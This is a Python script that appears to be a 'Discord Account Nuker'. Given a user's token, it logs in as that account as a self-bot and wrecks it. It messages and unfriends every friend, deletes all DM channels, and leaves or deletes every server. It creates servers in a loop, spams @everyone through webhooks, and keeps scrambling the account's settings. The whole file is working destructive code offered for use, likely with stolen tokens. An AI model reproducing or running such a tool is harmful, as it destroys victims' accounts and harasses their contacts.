import json
import requests
import asyncio
import sys
from time import sleep
import random, string
import discord

bot=discord.Client()

with open('Resources/nuker.png', 'rb') as f:
	icon = f.read()
token=sys.argv[1]

embed=discord.Embed(title="", url="https://github.com/", description="Account Was Destroyed Using Account Nuker By LALOL", color=0xff0000)
embed.set_author(name="Account Nuker By LALOL", url="https://github.com/Its-LALOL/Discord-Account-Nuker")
jfj=0
gaif=0
RemovedFriends=0

async def RemoveFriend(user, Friends):
	await user.dm_channel.send(f"||{user.mention}||", embed=embed)
	await user.remove_friend()
	global RemovedFriends
	RemovedFriends+=1
	if RemovedFriends==len(Friends):
		response=requests.get('https://discord.com/api/users/@me/channels', headers={'Authorization': token})
		info=response.json()
		for id1 in info:
			id=id1['id']
			requests.delete(f"https://discord.com/api/v9/channels/{id}", headers={'Authorization': token})
async def RemoveGuild(guild):
	try:
		await guild.leave()
		return
	except: pass
	try:
		await guild.delete()
		return
	except: pass
@bot.event
async def on_guild_join(guild):
	global jfj
	if jfj==1:
		for channel in guild.text_channels:
			webhook=await channel.create_webhook(name="Account Nuker By LALOL", reason="Account Nuker By LALOL", avatar=icon)
			for i in range(3):
				await webhook.send(content="||@everyone||", embed=embed)
async def CreateGuild():
	while True:
		name='Account Nuker By LALOL '+''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=4))
		try:
			guild=await bot.create_guild(name=name, icon=icon)
		except:
			global gaif
			gaif=1
			break
async def ThemeChanger():
	while True:
		json={
			'theme': "light", 'locale': random.choice(['hi', 'th']),
			'custom_status': {'text': "Account Nuker By LALOL", 'emoji_name': random.choice(emojis)},
			'status': random.choice(["online", "idle", "dnd", "invisible"]),
			'message_display_compact': random.choice(['true', 'false']),
			'developer_mode': random.choice(['true', 'false']),
			'friend_source_flags': {'all': "false", 'mutual_friends': 'false', 'mutual_guilds': 'false',}
		}
		requests.patch("https://discord.com/api/v6/users/@me/settings", headers={'Authorization': token}, json=json)
		await asyncio.sleep(0.5)
		global gaif
		if gaif==1:
			exit()
			break
@bot.event
async def on_ready():
	global jfj
	jfj=1
	asyncio.create_task(ThemeChanger())
	Friends=bot.user.friends
	for user in Friends:
		asyncio.create_task(RemoveFriend(user, Friends))
	for guild in bot.guilds:
		asyncio.create_task(RemoveGuild(guild))
	asyncio.create_task(CreateGuild())
emojis=["💥","🤡","☠️","⚠️"]
bot.run(token, bot=False)